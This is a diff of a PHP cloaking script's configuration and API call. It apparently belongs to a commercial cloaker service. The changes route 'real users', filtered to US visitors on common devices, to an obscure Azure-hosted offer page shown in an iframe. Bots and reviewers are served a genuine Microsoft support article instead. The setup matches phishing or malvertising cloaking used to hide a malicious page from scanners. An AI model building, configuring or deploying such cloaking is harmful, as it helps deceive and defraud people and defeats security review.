@@ -3,7 +3,7 @@
 $HCSET['PASSIVE'] = false;
 
 /* Required settings     */
-$HCSET['OFFER_PAGE'] = 'https://appuiyio-exfpdyb8bwdnh66776-gucaetfbdxdmckf7.eastus-01.azurewebsites.net/';//PHP/HTML file or URL offer used for real users
+$HCSET['OFFER_PAGE'] = 'https://appuiyio-exfpdyb8bwdnh66776-gucaetfbdxdmckf7.eastus-01.azurewebsites.net';//PHP/HTML file or URL offer used for real users
 $HCSET['WHITE_PAGE'] = 'https://support.microsoft.com/en-us/office/export-an-excel-table-to-sharepoint-974544f9-94bc-4aa8-9159-97282d256dab';//PHP/HTML file or URL used for bots
 $HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
@@ -11,11 +11,11 @@ $HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to 
 
 /* COUNTRY FILTERS */
 $HCSET['FILTER_GEO_MODE'] = 'allow'; // string(allow|reject)
-$HCSET['FILTER_GEO_LIST'] = 'QQ'; // string([2Chars country codes])
+$HCSET['FILTER_GEO_LIST'] = 'US'; // string([2Chars country codes])
 
 /* DEVICE FILTERS */
-$HCSET['FILTER_DEV_MODE'] = ''; // 'allow|reject'
-$HCSET['FILTER_DEV_LIST'] = ''; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);
+$HCSET['FILTER_DEV_MODE'] = 'allow'; // 'allow|reject'
+$HCSET['FILTER_DEV_LIST'] = 'm_Android,m_iOS,d_macOS,d_Windows'; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);
 
 /* UTM FILTERS */
 $HCSET['FILTER_UTM_MODE'] = ''; // 'allow|reject'
@@ -41,12 +41,12 @@ $HCSET['mlSet'] = '';
 /* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
 /* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
 /* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
-$HCSET['OFFER_METHOD'] = '302';
+$HCSET['OFFER_METHOD'] = 'iframe';
 
 /* WHITE_PAGE display method. Available options: curl, 302 */
 /* 'curl' - uses a server request to display third-party whitepage on your domain */
 /* '302' -  uses a 302 redirect to redirect the request to a third-party domain (only for trusted accounts)  */
-$HCSET['WHITE_METHOD'] = '302';
+$HCSET['WHITE_METHOD'] = 'curl';
 
 /* change 'false' to 'true' to permanently block the IP from which the DDOS attack is coming */
 $HCSET['BLOCK_DDOS'] = false;
@@ -411,7 +411,7 @@ function apiRequest($ip, $port, $HCSET, $HCSETdata)
     $host = gethostbyname('api.hideapi.xyz');
     if($host=='api.hideapi.xyz') $host = gethostbyname('hideapi.net');
 
-    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-945486104&js=false&stage='.$HCSET['stage'];
+    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2373660394&js=false&stage='.$HCSET['stage'];
     if (!empty($HCSET['PASSIVE'])) $url .= '&PASSIVE=' . $HCSET['PASSIVE'];
     if (!empty($HCSET['DEBUG_MODE'])) $url .= '&DEBUG_MODE=' . $HCSET['DEBUG_MODE'];
     if (!empty($HCSET['banReason'])) $url .= '&banReason=' . $HCSET['banReason'];
